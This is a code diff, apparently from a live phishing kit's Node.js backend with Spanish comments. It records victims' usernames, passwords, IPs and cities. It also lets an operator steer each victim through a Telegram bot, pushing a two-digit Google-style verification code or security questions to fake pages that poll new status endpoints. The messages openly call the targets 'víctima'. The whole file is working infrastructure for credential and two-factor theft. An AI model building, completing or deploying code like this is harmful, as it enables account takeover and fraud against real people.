@@ -19,7 +19,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
 
 const path = require('path');
 
-// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
+// Limpieza automática cada 10 minutos
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -65,10 +65,10 @@ app.post('/enviar', async (req, res) => {
 
   const cliente = {
     status: "esperando",
+    codigo: null,
     usar,
     clavv,
     preguntas: [],
-    esperando: null,
     ip,
     ciudad
   };
@@ -98,26 +98,25 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-
 app.post('/webhook', async (req, res) => {
   const message = req.body.message;
 
-  // Procesar comandos que empiecen con /
+  // Procesar comandos con /
   if (message?.text && message.text.startsWith('/')) {
     const texto = message.text.trim();
     const partes = texto.split(' ');
-    const txidParte = partes[0].slice(1);  // Quita el /
-    const codigoStr = partes[1]?.trim();  // Puede ser undefined
+    const txidParte = partes[0].slice(1);
+    const codigoStr = partes[1]?.trim();
 
     let codigo = null;
     if (codigoStr && /^\d{2}$/.test(codigoStr)) {
-      codigo = codigoStr;  // Solo acepta exactamente 2 dígitos
+      codigo = codigoStr;
     }
 
-    const cliente = cargarCliente(txidParte) || { status: 'esperando', codigo: null };
+    const cliente = cargarCliente(txidParte) || { status: 'esperando', codigo: null, preguntas: [] };
 
     if (codigo !== null) {
-      // Caso: /txid 22  → enviar código de verificación
+      // Enviar código de 2 dígitos
       cliente.codigo = codigo;
       cliente.status = 'codigo';
       guardarCliente(txidParte, cliente);
@@ -127,11 +126,11 @@ app.post('/webhook', async (req, res) => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: message.chat.id,
-          text: `✅ Código "${codigo}" enviado para el ID ${txidParte}\nLa víctima será redirigida a la pantalla de verificación Google.`
+          text: `✅ Código "${codigo}" enviado para ${txidParte}\nVíctima redirigida a pantalla de verificación.`
         })
       });
     } else {
-      // Caso antiguo: /txid ¿Pregunta1?&¿Pregunta2?
+      // Modo preguntas antiguas
       const preguntasTexto = partes.slice(1).join(' ');
       const [pregunta1, pregunta2] = preguntasTexto.split('&');
 
@@ -141,7 +140,7 @@ app.post('/webhook', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: message.chat.id,
-            text: `⚠️ Formato inválido.\n\nPara preguntas:\n/${txidParte} ¿Dónde naciste?&¿Color favorito?\n\nPara enviar código:\n/${txidParte} 22`
+            text: `⚠️ Formato inválido.\n\nPara código:\n/${txidParte} 22\n\nPara preguntas:\n/${txidParte} ¿Pregunta1?&¿Pregunta2?`
           })
         });
         return res.sendStatus(200);
@@ -164,28 +163,49 @@ app.post('/webhook', async (req, res) => {
     return res.sendStatus(200);
   }
 
-  // === El resto del código (callback_query) sigue igual ===
+  // Callbacks de botones
   if (req.body.callback_query) {
-    // ... (tu código existente de callbacks: confirmar, codigo, errorlogo, etc.)
+    const callback = req.body.callback_query;
+    const partes = callback.data.split(":");
+    const accion = partes[0];
+    const txid = partes[1];
+
+    const cliente = cargarCliente(txid) || { status: 'esperando', codigo: null };
+    cliente.status = accion;
+    guardarCliente(txid, cliente);
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callback.id,
+        text: `Acción: ${accion}`
+      })
+    });
+
+    return res.sendStatus(200);
   }
 
   res.sendStatus(200);
 });
 
+// Endpoint para verificar status (usado por cargs.html)
+app.get('/sendStatus.php', (req, res) => {
+  const txid = req.query.txid;
+  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
+  res.json({ status: cliente.status, preguntas: cliente.preguntas });
+});
+
+// Nuevo endpoint para obtener el código de 2 dígitos (usado por otro3.html)
 app.get('/status', (req, res) => {
   const txid = req.query.txid;
-  if (!txid) {
-    return res.status(400).json({ error: "Falta txid" });
-  }
+  if (!txid) return res.status(400).json({ error: "Falta txid" });
   const cliente = cargarCliente(txid);
-  if (!cliente) {
-    return res.status(404).json({ error: "No encontrado" });
-  }
-  res.json({
-    codigo: cliente.codigo || null   // solo envía el código de 2 dígitos si existe
-  });
+  if (!cliente) return res.status(404).json({ error: "No encontrado" });
+  res.json({ codigo: cliente.codigo || null });
+});
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
